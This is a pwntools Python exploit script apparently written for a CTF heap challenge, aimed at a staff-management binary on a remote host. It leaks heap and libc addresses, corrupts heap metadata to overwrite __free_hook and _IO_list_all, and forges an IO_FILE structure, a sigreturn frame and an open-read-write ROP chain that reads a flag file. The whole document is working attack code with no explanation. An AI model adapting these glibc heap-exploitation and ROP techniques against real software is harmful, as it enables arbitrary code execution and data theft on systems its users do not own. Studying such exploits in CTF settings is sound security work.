from pwn import*
#context.log_level = 'DEBUG'
context.binary = './main'
def init(string1,string2):
	p.sendafter('Input String1:',string1)
	p.sendafter('Input String2:',string2)
def menu(ch):
	p.sendlineafter('>>>',str(ch))
def new(name,index,size,content,sign=1):
	menu(1)
	p.sendafter('Input Name of Staff:',name)
	p.sendlineafter('Input Number of Staff:',str(index))
	p.sendlineafter('Input len of Info:',str(size))
	p.sendafter('get Info:',content)
def rename(index,name):
	menu(2)
	p.sendlineafter('Input Number:',str(index))
	p.sendlineafter('Info','1')
	p.sendafter('name:',name)
def reinfo(index,size,content):
	menu(2)
	p.sendlineafter('Input Number:',str(index))
	p.sendlineafter('Info','2')
	p.sendlineafter('Input len of Info:',str(size))
	p.sendafter('info:',content)
def free(index):
	menu(3)
	p.sendlineafter('Input Number of Staff:',str(index))
def show(index):
	menu(4)
	p.sendlineafter('Input staff number:',str(index))
p = process('./main')
p = remote('122.112.231.25',8005)
libc =ELF('./libc-2.23.so')
init('\x01F\n','\x02!\n')
new('fmyy',0,0x80,'FMYY')
new('fmyy',1,0x80,'FMYY')
new('fmyy',2,0x10,'FMYY')
free(1)
free(0)
new('FMYYSSSS',0,0x40,'\xA0')
show(0)
p.recvuntil('FMYYSSSS')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x90
log.info('HEAP:\t' + hex(heap_base))
log.info('LIBC:\t' + hex(libc_base))
new('fmyy',1,0x20,'FMYY')
####################################
free_hook = libc_base + libc.sym['__free_hook']

pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rdx_ret = libc_base + 0x0000000000001B92
syscall = libc_base + libc.sym['syscall'] + 23

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
IO_str_jumps = libc_base + 0x3C37A0
ret  = libc_base + 0x937
fake_IO_FILE  = p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(heap_base + 0x520)
fake_IO_FILE  = fake_IO_FILE.ljust(0xC8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['setcontext'] + 53)

orw  = p64(pop_rdi_ret)+p64(heap_base + 0x778)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(pop_rsi_ret) + p64(heap_base)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(heap_base)
orw += p64(Puts)
orw  = orw.ljust(0xE8,'\x00')
orw += './flag\x00\x00'


frame = SigreturnFrame()
frame.rsp = heap_base + 0x690
frame.rip = ret

####################################

new(p64(heap_base) + p64(0x100),3,0x38,'\x00'*0x30 + p64(heap_base + 0x310))
reinfo(3,0x10,'FMYY')

menu(1)
p.sendafter('Input Name of Staff:',p64(heap_base + 0x2F0) + p64(0x10))
p.sendlineafter('Input Number of Staff:','4')
p.sendlineafter('Input len of Info:',str(0x101))
new('fmyy',5,0x100,fake_IO_FILE)
reinfo(4,0x10,p64(free_hook))
rename(4,p64(libc_base + libc.sym['exit']))

reinfo(4,0x10,p64(libc_base+libc.symbols['_IO_list_all']))
rename(4,p64(heap_base + 0x3A0))

new('fmyy',6,0x100,str(frame))
new('fmyy',7,0x100,orw)
free(0)
p.interactive()
